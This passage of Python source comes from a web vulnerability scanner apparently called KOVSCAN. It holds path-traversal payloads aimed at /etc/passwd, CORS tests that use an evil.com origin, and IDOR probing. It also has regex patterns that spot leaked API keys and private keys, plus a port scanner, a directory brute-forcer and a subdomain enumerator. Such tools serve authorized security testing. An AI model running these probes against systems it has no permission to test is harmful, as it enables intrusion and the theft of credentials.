                        f'name="{csrf}"' in html or f'name= "{csrf}"' in html
                        for csrf in csrf_indicators
                    )
                    if not has_csrf_meta:
                        self.add_vuln("CSRF (Missing Protection)", action_url, "N/A", "N/A", "MEDIUM",
                                      "No CSRF protection detected", f"Form inputs: {', '.join(input_names)}")
                except Exception:
                    continue
        log.info(f"CSRF scan complete. Found: {sum(1 for v in self.vulnerabilities if 'CSRF' in v['type'])}")

    # ---- PATH TRAVERSAL ----
    def check_path_traversal(self):
        log.section("PATH TRAVERSAL SCAN")
        traversal_payloads = [
            "../", "../../", "../../../", "../../../../",
            "../../../../../", "../../../../../../",
            "..\\", "..\\..\\", "..\\..\\..\\",
            "....//....//", "....//....//....//",
            "..%252f", "..%252f..%252f",
            "..%c0%af", "..%c0af..%c0af",
            "%2e%2e%2f", "%2e%2e%2f%2e%2e%2f",
            "../../../../../../etc/passwd",
            "../../../../windows/system32/drivers/etc/hosts",
        ]
        traversal_indicators = ["root:x:0:0:", "[fonts]", "[extensions]", "; for 16-bit app support", "localhost"]
        trav_params = ['file', 'path', 'dir', 'template', 'page', 'include', 'load',
                       'show', 'document', 'folder', 'root', 'cat', 'view', 'content']

        def test_traversal(url: str):
            parsed = urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param_name, param_values in params.items():
                if param_name.lower() in trav_params:
                    for payload in traversal_payloads:
                        try:
                            test_url = url.replace(
                                f"{param_name}={param_values[0]}",
                                f"{param_name}={quote(payload)}"
                            )
                            resp = self.session.get(test_url, timeout=self.timeout)
                            for indicator in traversal_indicators:
                                if indicator in resp.text:
                                    self.add_vuln("Path Traversal", url, param_name, payload, "HIGH",
                                                  "Directory traversal — filesystem accessible",
                                                  f"Indicator: {indicator}")
                                    break
                        except Exception:
                            continue

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(test_traversal, u) for u in self.param_urls]
            for f in as_completed(futures):
                pass
        log.info(f"Path Traversal scan complete. Found: {sum(1 for v in self.vulnerabilities if 'Traversal' in v['type'])}")

    # ---- IDOR ----
    def check_idor(self):
        log.section("IDOR / AUTHORIZATION CHECK")
        idor_patterns = [
            (r'/user/(\d+)', '/user/'),
            (r'/profile/(\d+)', '/profile/'),
            (r'/account/(\d+)', '/account/'),
            (r'/order/(\d+)', '/order/'),
            (r'/invoice/(\d+)', '/invoice/'),
            (r'/document/(\d+)', '/document/'),
            (r'/file/(\d+)', '/file/'),
            (r'/download/(\d+)', '/download/'),
            (r'id=(\d+)', 'id='),
            (r'user_id=(\d+)', 'user_id='),
            (r'userId=(\d+)', 'userId='),
            (r'profile_id=(\d+)', 'profile_id='),
        ]

        def test_idor(url: str):
            for pattern, base_path in idor_patterns:
                match = re.search(pattern, url)
                if match:
                    orig_id = match.group(1)
                    for new_id in ['1', '2', '10', '100', '1000', 'admin', '0']:
                        if new_id == orig_id:
                            continue
                        try:
                            test_url = url.replace(f"{orig_id}", f"{new_id}", 1)
                            resp = self.session.get(test_url, timeout=self.timeout)
                            if resp.status_code == 200:
                                # Check if different content
                                orig_resp = self.session.get(url, timeout=self.timeout)
                                if resp.text != orig_resp.text and len(resp.text) > 100:
                                    self.add_vuln("IDOR (Insecure Direct Object Reference)", url,
                                                  f"ID: {orig_id}", f"Changed to: {new_id}", "HIGH",
                                                  "Direct object reference — unauthorized access to resource",
                                                  f"Accessing ID {new_id} returned 200")
                                    break
                        except Exception:
                            continue

        with ThreadPoolExecutor(max_workers=min(self.threads, 10)) as executor:
            futures = [executor.submit(test_idor, u) for u in self.param_urls + self.spider.get('urls', [])]
            for f in as_completed(futures):
                pass
        log.info(f"IDOR scan complete. Found: {sum(1 for v in self.vulnerabilities if 'IDOR' in v['type'])}")

    # ---- CORS ----
    def check_cors(self):
        log.section("CORS MISCONFIGURATION CHECK")
        origins_to_test = [
            "https://evil.com",
            "null",
            "https://evil.com.evil.com",
        ]
        tested = set()

        for url in self.spider.get('urls', [])[:30]:
            if url in tested:
                continue
            tested.add(url)
            for origin in origins_to_test:
                try:
                    resp = self.session.get(url, headers={'Origin': origin}, timeout=self.timeout)
                    acao = resp.headers.get('Access-Control-Allow-Origin', '')
                    acac = resp.headers.get('Access-Control-Allow-Credentials', '')
                    if origin in acao and 'true' in acac:
                        self.add_vuln("CORS Misconfiguration", url, "Origin", origin, "HIGH",
                                      "CORS allows credentials from arbitrary origins",
                                      f"ACAO: {acao}, ACAC: {acac}")
                        break
                    if origin in acao:
                        self.add_vuln("CORS Misconfiguration", url, "Origin", origin, "MEDIUM",
                                      "CORS allows arbitrary origin (no credentials)",
                                      f"ACAO: {acao}")
                        break
                    if '*' in acao and 'true' in acac:
                        self.add_vuln("CORS Misconfiguration", url, "Origin", origin, "HIGH",
                                      "CORS wildcard with credentials allowed",
                                      f"ACAO: {acao}")
                        break
                except Exception:
                    continue
        log.info(f"CORS scan complete. Found: {sum(1 for v in self.vulnerabilities if 'CORS' in v['type'])}")

    # ---- SENSITIVE DATA EXPOSURE ----
    def check_sensitive_data(self):
        log.section("SENSITIVE DATA EXPOSURE CHECK")
        sensitive_patterns = [
            (r'AKIA[0-9A-Z]{16}', 'AWS Access Key ID', 'HIGH'),
            (r'SK-[a-zA-Z0-9]{32,}', 'Stripe API Key', 'HIGH'),
            (r'ghp_[a-zA-Z0-9]{36}', 'GitHub Personal Access Token', 'HIGH'),
            (r'gho_[a-zA-Z0-9]{36}', 'GitHub OAuth Access Token', 'HIGH'),
            (r'ghu_[a-zA-Z0-9]{36}', 'GitHub User-to-Server Token', 'HIGH'),
            (r'xox[baprs]-[0-9a-zA-Z-]{10,}', 'Slack Token', 'HIGH'),
            (r'-----BEGIN RSA PRIVATE KEY-----', 'RSA Private Key', 'CRITICAL'),
            (r'-----BEGIN OPENSSH PRIVATE KEY-----', 'OpenSSH Private Key', 'CRITICAL'),
            (r'-----BEGIN DSA PRIVATE KEY-----', 'DSA Private Key', 'CRITICAL'),
            (r'-----BEGIN EC PRIVATE KEY-----', 'EC Private Key', 'CRITICAL'),
            (r'-----BEGIN PGP PRIVATE KEY BLOCK-----', 'PGP Private Key', 'CRITICAL'),
            (r'password\s*[=:]\s*["\']?[^"\'\s]+', 'Password (potential)', 'HIGH'),
            (r'passwd\s*[=:]\s*["\']?[^"\'\s]+', 'Password (potential)', 'HIGH'),
            (r'secret\s*[=:]\s*["\']?[^"\'\s]+', 'Secret (potential)', 'MEDIUM'),
            (r'api[_-]?key\s*[=:]\s*["\']?[^"\'\s]+', 'API Key', 'HIGH'),
            (r'apikey\s*[=:]\s*["\']?[^"\'\s]+', 'API Key', 'HIGH'),
            (r'DB_PASSWORD', 'Database Password Variable', 'HIGH'),
            (r'DB_HOST', 'Database Host Variable', 'MEDIUM'),
            (r'DB_USER', 'Database User Variable', 'MEDIUM'),
            (r'MYSQL_PASSWORD', 'MySQL Password Variable', 'HIGH'),
            (r'POSTGRES_PASSWORD', 'Postgres Password Variable', 'HIGH'),
            (r'SECRET_KEY\s*[=:]\s*["\']?[^"\'\s]+', 'Secret Key (Django/Flask)', 'CRITICAL'),
            (r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}', 'JWT Token', 'HIGH'),
            (r'session\s*[=:]\s*["\']?[a-zA-Z0-9]{20,}', 'Session Key', 'MEDIUM'),
            (r'(?:https?://)?(?:[a-z0-9-]+\.)+[a-z]{2,}/?\.git/config', '.git/config URL', 'MEDIUM'),
        ]

        for url in self.spider.get('urls', [])[:50]:
            try:
                resp = self.session.get(url, timeout=self.timeout)
                for pattern, desc, severity in sensitive_patterns:
                    matches = re.findall(pattern, resp.text)
                    if matches:
                        for match in matches[:2]:
                            self.add_vuln(f"Sensitive Data: {desc}", url, "N/A",
                                          match[:50], severity,
                                          f"Sensitive data exposed in response",
                                          f"Pattern: {pattern}")
            except Exception:
                continue

        # Check comments specifically
        for comment in self.spider.get('comments', []):
            for pattern, desc, severity in sensitive_patterns:
                if re.search(pattern, comment):
                    self.add_vuln(f"Sensitive Data in HTML Comment: {desc}", self.target,
                                  "HTML Comment", comment[:80], severity,
                                  "Sensitive data in HTML comment", "Found in comment")

        # Check JavaScript files
        for js_url in self.spider.get('javascripts', []):
            try:
                resp = self.session.get(js_url, timeout=self.timeout)
                for pattern, desc, severity in sensitive_patterns:
                    matches = re.findall(pattern, resp.text)
                    if matches:
                        for match in matches[:1]:
                            self.add_vuln(f"Sensitive Data in JS: {desc}", js_url, "N/A",
                                          match[:50], severity,
                                          "Sensitive data in JavaScript file", f"Pattern: {pattern}")
            except Exception:
                continue

        log.info(f"Sensitive data scan complete. Found: {sum(1 for v in self.vulnerabilities if 'Sensitive' in v['type'])}")

    def run_all(self) -> List[Dict]:
        start_time = time.time()
        self.check_sqli()
        self.check_xss()
        self.check_lfi_rfi()
        self.check_ssti()
        self.check_ssrf()
        self.check_xxe()
        self.check_cmdi()
        self.check_open_redirect()
        self.check_csrf()
        self.check_path_traversal()
        self.check_idor()
        self.check_cors()
        self.check_sensitive_data()
        elapsed = time.time() - start_time
        log.section("VULNERABILITY SCAN SUMMARY")
        log.success(f"All scans complete in {elapsed:.2f}s")
        log.success(f"Total vulnerabilities found: {len(self.vulnerabilities)}")
        return self.vulnerabilities


# ============================================================
# PORT SCANNER
# ============================================================

class PortScanner:
    COMMON_PORTS = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 111: "RPC", 123: "NTP", 135: "RPC",
        137: "NetBIOS", 139: "NetBIOS", 143: "IMAP", 161: "SNMP",
        389: "LDAP", 443: "HTTPS", 445: "SMB", 465: "SMTPS",
        500: "IKE", 514: "Syslog", 587: "SMTP", 636: "LDAPS",
        993: "IMAPS", 995: "POP3S", 1025: "RPC", 1080: "SOCKS",
        1194: "OpenVPN", 1352: "Lotus Notes", 1433: "MSSQL",
        1434: "MSSQL", 1521: "Oracle DB", 2049: "NFS", 2082: "cPanel",
        2083: "cPanel SSL", 2086: "WHM", 2087: "WHM SSL",
        2095: "Webmail", 2096: "Webmail SSL", 2181: "ZooKeeper",
        2222: "SSH Alt", 2375: "Docker", 2376: "Docker TLS",
        2443: "HTTPS Alt", 2480: "OrientDB", 3000: "Dev Server",
        3128: "Squid Proxy", 3306: "MySQL", 3389: "RDP",
        3690: "SVN", 4000: "Dev Server", 4040: "Jenkins",
        4333: "MySQL Alt", 4369: "Erlang Port Mapper", 4444: "Metasploit",
        4505: "SaltStack", 4506: "SaltStack", 4443: "HTTPS Alt",
        4848: "GlassFish", 5000: "Dev Server", 5001: "Dev Server",
        5004: "MySQL Alt", 5005: "MySQL Alt", 5432: "PostgreSQL",
        5555: "ADB", 5601: "Kibana", 5672: "RabbitMQ",
        5800: "VNC", 5900: "VNC", 5901: "VNC", 5984: "CouchDB",
        5985: "WinRM", 5986: "WinRM SSL", 6000: "X11", 6001: "X11",
        6379: "Redis", 6380: "Redis SSL", 6443: "Kubernetes API",
        7077: "Spark", 7474: "Neo4j", 8000: "HTTP Alt",
        8001: "HTTP Alt", 8008: "HTTP Alt", 8009: "AJP",
        8010: "HTTP Alt", 8042: "Hadoop", 8069: "Odoo",
        8080: "HTTP Proxy", 8081: "HTTP Alt", 8082: "HTTP Alt",
        8083: "HTTP Alt", 8084: "HTTP Alt", 8085: "HTTP Alt",
        8086: "InfluxDB", 8087: "HTTP Alt", 8088: "HTTP Alt",
        8089: "Splunk", 8090: "HTTP Alt", 8091: "Couchbase",
        8092: "Couchbase", 8096: "Emby", 8180: "HTTP Alt",
        8200: "Vault", 8332: "Bitcoin", 8333: "Bitcoin",
        8443: "HTTPS Alt", 8500: "Consul", 8530: "Drupal",
        8531: "Drupal SSL", 8686: "HTTP Alt", 8761: "Eureka",
        8787: "JBoss", 8834: "Nessus", 8888: "HTTP Alt",
        8983: "Solr", 8990: "HTTP Alt", 9000: "HTTP Alt",
        9001: "HTTP Alt", 9002: "HTTP Alt", 9042: "Cassandra",
        9043: "WebSphere", 9060: "WebSphere", 9080: "WebSphere",
        9090: "HTTP Alt", 9092: "Kafka", 9100: "Print",
        9160: "Cassandra", 9200: "Elasticsearch", 9300: "Elasticsearch",
        9418: "Git", 9999: "HTTP Alt", 10000: "Webmin",
        10001: "Webmin", 10050: "Zabbix", 10051: "Zabbix",
        11211: "Memcached", 11214: "Memcached", 12000: "HTTP Alt",
        12345: "NetBus", 15672: "RabbitMQ", 16010: "HBase",
        16379: "Redis Alt", 17017: "MongoDB", 18018: "HTTP Alt",
        20000: "HTTP Alt", 25565: "Minecraft", 27017: "MongoDB",
        27018: "MongoDB", 27019: "MongoDB", 28015: "RethinkDB",
        28017: "MongoDB", 30000: "HTTP Alt", 32768: "RPC",
        49152: "RPC", 49153: "RPC", 49154: "RPC", 49155: "RPC",
        49156: "RPC", 49157: "RPC", 50000: "SAP", 50070: "Hadoop",
        50075: "Hadoop", 50470: "Hadoop", 61616: "ActiveMQ",
    }

    def __init__(self, host: str, ports: List[int] = None, threads: int = 100, timeout: float = 1.5):
        self.target_host = host
        if ports:
            self.ports = ports
        else:
            self.ports = list(self.COMMON_PORTS.keys())
        self.threads = min(threads, 200)
        self.timeout = timeout
        self.open_ports = []
        self.lock = threading.Lock()

    def scan_port(self, port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target_host, port))
            sock.close()
            return result == 0
        except:
            return False

    def grab_banner(self, port: int) -> str:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.target_host, port))
            banner = b""
            try:
                sock.send(b"\r\n")
                banner = sock.recv(1024)
            except:
                if port == 443:
                    try:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        ssock = ctx.wrap_socket(sock, server_hostname=self.target_host)
                        ssock.send(b"GET / HTTP/1.0\r\n\r\n")
                        banner = ssock.recv(1024)
                        ssock.close()
                    except:
                        pass
            sock.close()
            decoded = banner.decode('utf-8', errors='ignore').strip()
            return decoded[:200]
        except:
            return ""

    def scan(self) -> List[Dict]:
        log.section("PORT SCANNER")
        log.info(f"Target: {self.target_host}")
        log.info(f"Ports to scan: {len(self.ports)}")
        log.info(f"Threads: {self.threads}")

        start = time.time()
        self.open_ports = []

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            fut_to_port = {}
            for port in self.ports:
                future = executor.submit(self.scan_port, port)
                fut_to_port[future] = port
            for future in as_completed(fut_to_port):
                port = fut_to_port[future]
                if future.result():
                    self.open_ports.append(port)

        self.open_ports.sort()
        elapsed = time.time() - start
        log.success(f"Port scan complete in {elapsed:.2f}s")
        log.success(f"Open ports found: {len(self.open_ports)}")

        results = []
        for port in self.open_ports:
            service = self.COMMON_PORTS.get(port, "Unknown")
            banner = self.grab_banner(port)
            result = {
                'port': port,
                'state': 'open',
                'service': service,
                'banner': banner
            }
            results.append(result)
            print(f"  {Colors.GREEN}PORT {port}/{service}{Colors.RESET} - {banner[:80] if banner else 'No banner'}")

        return results


# ============================================================
# DIRECTORY/ENDPOINT BRUTE FORCER
# ============================================================

class DirectoryBruteForcer:
    COMMON_DIRS = [
        'admin', 'wp-admin', 'administrator', 'login', 'dashboard', 'backend',
        'api', 'v1', 'v2', 'api/v1', 'api/v2', 'rest', 'graphql',
        'config', 'configuration', 'setup', 'install', 'status',
        '.git', '.svn', '.env', '.htaccess', '.htpasswd',
        'backup', 'backups', 'db', 'database', 'sql', 'dump',
        'uploads', 'files', 'download', 'images', 'img', 'assets',
        'css', 'js', 'scripts', 'includes', 'inc',
        'phpmyadmin', 'pma', 'adminer', 'mysql',
        'server-status', 'server-info', 'cgi-bin',
        'test', 'tests', 'dev', 'development', 'staging',
        'robots.txt', 'sitemap.xml', 'crossdomain.xml',
        'xmlrpc.php', 'wp-login.php', 'wp-content', 'wp-includes',
        'panel', 'cpanel', 'webmail', 'mail',
        'docs', 'documentation', 'help', 'guide',
        'static', 'public', 'private', 'temp', 'tmp',
        'logs', 'log', 'error_log', 'debug',
        'shell', 'cmd', 'command', 'exec',
        'proxy', 'socks', 'tunnel',
        'swagger', 'api-docs', 'openapi.json',
        'health', 'healthz', 'metrics', 'info',
        '.well-known', 'security.txt',
        'vendor', 'node_modules', 'bower_components',
        'src', 'dist', 'build', 'release',
    ]

    COMMON_FILES = [
        'index.php', 'index.html', 'index.htm', 'default.asp', 'default.aspx',
        'config.php', 'config.php.bak', 'config.php~', 'config.php.old',
        'wp-config.php', 'wp-config.php.bak',
        '.htaccess', '.htpasswd', '.gitignore', '.env',
        'composer.json', 'package.json', 'bower.json',
        'Dockerfile', 'docker-compose.yml',
        'Makefile', 'README.md', 'CHANGELOG.md',
        'docker-compose.yml', 'k8s.yml', 'deployment.yml',
        'appspec.yml', 'cloudformation.yml',
        'Procfile', 'requirements.txt', 'Gemfile',
        'credentials', 'credentials.txt', 'password.txt',
        'backup.sql', 'database.sql', 'dump.sql',
        'phpinfo.php', 'info.php', 'test.php',
        'sitemap.xml', 'robots.txt',
        'error.log', 'access.log',
        '.DS_Store', 'Thumbs.db',
    ]

    def __init__(self, target_url: str, wordlist: List[str] = None,
                 extensions: List[str] = None, threads: int = 50,
                 timeout: int = 5, recursive: bool = False):
        self.target = target_url.rstrip('/')
        base_wordlist = wordlist or self.COMMON_DIRS + self.COMMON_FILES
        self.wordlist = list(set(base_wordlist))
        self.extensions = extensions or ['.php', '.asp', '.aspx', '.jsp', '.do', '.action', '.html', '.htm']
        self.threads = threads
        self.timeout = timeout
        self.recursive = recursive
        self.found = []
        self.lock = threading.Lock()

        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def check_path(self, path: str) -> Optional[Dict]:
        url = f"{self.target}/{path.lstrip('/')}"
        try:
            resp = self.session.get(url, timeout=self.timeout, allow_redirects=False)
            if resp.status_code in (200, 201, 204, 301, 302, 303, 307, 308, 401, 403):
                result = {
                    'url': url,
                    'status': resp.status_code,
                    'size': len(resp.content),
                    'content_type': resp.headers.get('Content-Type', ''),
                    'redirect': resp.headers.get('Location', '')
                }
                with self.lock:
                    self.found.append(result)
                return result
        except:
            pass
        return None

    def scan(self) -> List[Dict]:
        log.section("DIRECTORY/FILE BRUTE FORCER")
        log.info(f"Target: {self.target}")
        log.info(f"Wordlist size: {len(self.wordlist)}")
        log.info(f"Threads: {self.threads}")

        start = time.time()
        self.found = []

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            fut_to_word = {}
            for word in self.wordlist:
                future = executor.submit(self.check_path, word)
                fut_to_word[future] = word
            for future in as_completed(fut_to_word):
                word = fut_to_word[future]
                result = future.result()
                if result:
                    status_colors = {
                        200: Colors.GREEN, 301: Colors.YELLOW, 302: Colors.YELLOW,
                        401: Colors.RED, 403: Colors.RED, 307: Colors.YELLOW, 308: Colors.YELLOW
                    }
                    color = status_colors.get(result['status'], Colors.WHITE)
                    print(f"  {color}[{result['status']}]{Colors.RESET} {result['url'][:80]}")

        elapsed = time.time() - start
        log.success(f"Directory brute force complete in {elapsed:.2f}s")
        log.success(f"Found {len(self.found)} paths")

        return self.found


# ============================================================
# SUBDOMAIN ENUMERATOR
# ============================================================

class SubdomainEnumerator:
    COMMON_SUBDOMAINS = [
        'www', 'mail', 'admin', 'api', 'dev', 'test', 'stage', 'staging',
        'blog', 'shop', 'app', 'portal', 'cms', 'backup',
        'beta', 'demo', 'cdn', 'cloud', 'docs', 'ftp', 'git',
        'help', 'm', 'mob', 'mobile', 'news', 'ns1', 'ns2',
        'old', 'panel', 'secure', 'server', 'support', 'sysadmin',
        'update', 'web', 'webmail', 'vpn', 'ww1', 'ww2',
        'jenkins', 'jira', 'confluence', 'wiki', 'redmine',
        'gitlab', 'bitbucket', 'svn', 'trac',
        'monitor', 'status', 'stats', 'analytics',
        's3', 'elastic', 'log', 'logs',
        'redis', 'mysql', 'db', 'database',
        'kibana', 'grafana', 'prometheus', 'alertmanager',
        'docker', 'kube', 'kubernetes', 'k8s',
        'swagger', 'api-docs', 'docs-api',
        'auth', 'login', 'register', 'signup',
        'sso', 'oauth', 'oidc',
        'corp', 'internal', 'hr', 'payroll',
        'live', 'prod', 'production',
        'sandbox', 'playground', 'lab',
        'remote', 'access', 'gateway',
        'ns', 'dns', 'mx', 'smtp', 'pop', 'imap',
        'owa', 'exchange', 'lync', 'skype',
        'rds', 'rdp', 'vnc', 'teamviewer',
        'zabbix', 'nagios', 'icinga', 'cacti',
        'puppet', 'chef', 'ansible', 'salt',
        'ldap', 'ad', 'dc', 'domain',
        'download', 'upload', 'share', 'file',
        'direct', 'stream', 'media', 'video',
        'testapi', 'testapp', 'devapi', 'devapp',
        'v2', 'v3', 'v1',
        'static', 'assets', 'res', 'resource',
        'new', 'old', 'archive',
        'portal', 'extranet', 'intranet',
        'partner', 'vendor', 'supplier',
        'wholesale', 'retail', 'distributor',
        'my', 'member', 'user', 'client',
        'store', 'cart', 'checkout', 'payment',
        'billing', 'invoice', 'account',
        'forums', 'forum', 'community',
        'jobs', 'careers', 'apply',
        'events', 'event', 'meetup',
        'webinar', 'training', 'learn',
        'go', 'link', 'short', 'tiny',
        'track', 'tracking', 'analytics',
        'notify', 'notification', 'push',
        'chat', 'livechat', 'talk',
        'voice', 'phone', 'call',
        'fac', 'vpn', 'remote',
        'owa', 'autodiscover', 'msoid',
        'lync', 'sfb', 'teams',
        'yammer', 'sharepoint', 'onedrive',
    ]

    def __init__(self, domain: str, wordlist: List[str] = None, threads: int = 50, timeout: int = 5):
        self.domain = domain.lower().strip()
        self.wordlist = wordlist or self.COMMON_SUBDOMAINS
        self.threads = threads
        self.timeout = timeout
        self.found = []
        self.lock = threading.Lock()

        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def check_subdomain(self, subdomain: str) -> Optional[Dict]:
        fqdn = f"{subdomain}.{self.domain}"
        url = f"https://{fqdn}"

        result = {
            'subdomain': fqdn,
            'resolves': False,
            'status': None,
            'ip': None,
            'title': None,
            'server': None,
        }

        try:
            ip = socket.gethostbyname(fqdn)
            result['resolves'] = True
            result['ip'] = ip
        except (socket.gaierror, socket.herror):
            return None

        try:
            resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            result['status'] = resp.status_code
            title_match = re.search(r'<title>(.*?)</title>', resp.text, re.IGNORECASE | re.DOTALL)
            if title_match:
                result['title'] = title_match.group(1).strip()[:80]
            result['server'] = resp.headers.get('Server', '')
        except:
            pass

        with self.lock:
            self.found.append(result)

        return result

    def scan(self) -> List[Dict]:
        log.section("SUBDOMAIN ENUMERATION")
        log.info(f"Domain: {self.domain}")
        log.info(f"Wordlist size: {len(self.wordlist)}")

        start = time.time()
        self.found = []

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            fut_to_sub = {}
            for sub in self.wordlist:
                future = executor.submit(self.check_subdomain, sub)
                fut_to_sub[future] = sub
            for future in as_completed(fut_to_sub):
                sub = fut_to_sub[future]
                result = future.result()
                if result:
                    status_str = f"[{result['status']}]" if result['status'] else ""
                    title_str = f" - {result['title']}" if result.get('title') else ""
                    print(f"  {Colors.GREEN}{result['subdomain']}{Colors.RESET} {status_str} ({result.get('ip', '')}){title_str}")

        elapsed = time.time() - start
        log.success(f"Subdomain enumeration complete in {elapsed:.2f}s")
        log.success(f"Found {len(self.found)} subdomains")

        return self.found


# ============================================================
# REPORT GENERATOR
# ============================================================

class ReportGenerator:
    def __init__(self, target: str, vulnerabilities: List[Dict],
                 open_ports: List[Dict], directories: List[Dict],
                 subdomains: List[Dict], spider_data: Dict,
                 output_file: str = "kovscan_report.html"):
        self.target = target
        self.vulnerabilities = vulnerabilities
        self.open_ports = open_ports
        self.directories = directories
        self.subdomains = subdomains
        self.spider_data = spider_data
        self.output_file = output_file

    def _escape_html(self, text: str) -> str:
        if not text:
            return ""
        text = str(text)
        text = text.replace('&', '&amp;')
        text = text.replace('<', '&lt;')
        text = text.replace('>', '&gt;')
        text = text.replace('"', '&quot;')
        text = text.replace("'", '&#x27;')
        return text

    def generate_html(self) -> str:
        severity_counts = Counter(v['severity'] for v in self.vulnerabilities)
        vuln_type_counts = Counter(v['type'] for v in self.vulnerabilities)
        now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KOVSCAN Report - {self._escape_html(self.target)}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0e17; color: #e0e0e0; }}
        .header {{ background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460); padding: 30px 40px; border-bottom: 3px solid #e94560; }}
        .header h1 {{ color: #e94560; font-size: 2.5em; margin-bottom: 10px; }}
        .header .subtitle {{ color: #a0a0b0; font-size: 1.1em; }}
        .container {{ max-width: 1200px; margin: 0 auto; padding: 30px; }}
        .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }}
        .summary-card {{ background: #1a1a2e; border-radius: 10px; padding: 20px; border: 1px solid #2a2a4e; }}
        .summary-card .label {{ color: #888; font-size: 0.9em; margin-bottom: 5px; }}
        .summary-card .value {{ font-size: 2em; font-weight: bold; }}
        .critical {{ color: #ff0000; }} .high {{ color: #ff6600; }} .medium {{ color: #ffcc00; }} .low {{ color: #00ccff; }}
        .section {{ background: #1a1a2e; border-radius: 10px; padding: 25px; margin-bottom: 25px; border: 1px solid #2a2a4e; }}
        .section h2 {{ color: #e94560; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }}
        table {{ width: 100%; border-collapse: collapse; margin-top: 10px; }}
        th {{ text-align: left; padding: 12px 10px; background: #0f3460; color: #e0e0e0; font-weight: 600; }}
        td {{ padding: 10px; border-bottom: 1px solid #2a2a4e; }}
        tr:hover {{ background: #16213e; }}
        .severity-badge {{ padding: 3px 10px; border-radius: 4px; font-weight: bold; font-size: 0.8em; }}
        .sev-critical {{ background: #ff0000; color: white; }}
        .sev-high {{ background: #ff6600; color: white; }}
        .sev-medium {{ background: #ffcc00; color: #111; }}
        .sev-low {{ background: #00ccff; color: #111; }}
        .vuln-detail {{ margin-top: 5px; font-size: 0.9em; color: #aaa; }}
        .footer {{ text-align: center; padding: 20px; color: #555; font-size: 0.8em; }}
        .timestamp {{ color: #666; font-size: 0.85em; margin-top: 15px; }}
        .tech-badge {{ display: inline-block; background: #0f3460; padding: 3px 10px; border-radius: 15px; margin: 2px; font-size: 0.85em; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>&#9673; KOVSCAN v3.0</h1>
        <div class="subtitle">God Tier Vulnerability Assessment</div>
        <div class="timestamp">Target: {self._escape_html(self.target)} | Scan Date: {now_str}</div>
    </div>
    
    <div class="container">
        <div class="summary">
            <div class="summary-card">
                <div class="label">Total Vulnerabilities</div>
                <div class="value" style="color: #e94560;">{len(self.vulnerabilities)}</div>
            </div>
            <div class="summary-card">
                <div class="label">Critical</div>
                <div class="value critical">{severity_counts.get('CRITICAL', 0)}</div>
            </div>
            <div class="summary-card">
                <div class="label">High</div>
                <div class="value high">{severity_counts.get('HIGH', 0)}</div>
            </div>
            <div class="summary-card">
                <div class="label">Medium</div>
                <div class="value medium">{severity_counts.get('MEDIUM', 0)}</div>
            </div>
            <div class="summary-card">
                <div class="label">Open Ports</div>
                <div class="value" style="color: #00ff88;">{len(self.open_ports)}</div>
            </div>
            <div class="summary-card">
                <div class="label">Directories Found</div>
                <div class="value" style="color: #00ff88;">{len(self.directories)}</div>
            </div>
            <div class="summary-card">
                <div class="label">Subdomains</div>
                <div class="value" style="color: #00ff88;">{len(self.subdomains)}</div>
            </div>
            <div class="summary-card">
                <div class="label">URLs Crawled</div>
                <div class="value" style="color: #8888ff;">{len(self.spider_data.get('urls', []))}</div>
            </div>
        </div>
        
        <div class="section">
            <h2>Vulnerability Breakdown by Type</h2>
            <table>
                <tr><th>Vulnerability Type</th><th>Count</th><th>Severity Distribution</th></tr>
'''

        for vuln_type, count in sorted(vuln_type_counts.items(), key=lambda x: -x[1]):
            sevs = [v['severity'] for v in self.vulnerabilities if v['type'] == vuln_type]
            sev_badges = []
            for s in sorted(set(sevs)):
                sev_badges.append(f'<span class="severity-badge sev-{s.lower()}">{self._escape_html(s)}</span>')
            sev_str = ', '.join(sev_badges)
            html += f'<tr><td>{self._escape_html(vuln_type)}</td><td>{count}</td><td>{sev_str}</td></tr>\n'

        html += '''
            </table>
        </div>
        
        <div class="section">
            <h2>Vulnerability Details</h2>
            <table>
                <tr><th>Severity</th><th>Type</th><th>URL</th><th>Parameter</th><th>Details</th></tr>
'''

        for vuln in self.vulnerabilities:
            sev_class = f'sev-{vuln["severity"].lower()}'
            desc = self._escape_html(vuln.get("description", ""))[:100]
            payload_str = self._escape_html(vuln.get("payload", ""))
            evidence_str = self._escape_html(vuln.get("evidence", ""))
            html += f'''<tr>
                <td><span class="severity-badge {sev_class}">{self._escape_html(vuln["severity"])}</span></td>
                <td>{self._escape_html(vuln["type"])}</td>
                <td style="word-break: break-all; max-width: 300px;">{self._escape_html(vuln["url"])}</td>
                <td>{self._escape_html(vuln.get("parameter", ""))}</td>
                <td>
                    <div>{desc}</div>
                    <div class="vuln-detail">
'''
            if payload_str:
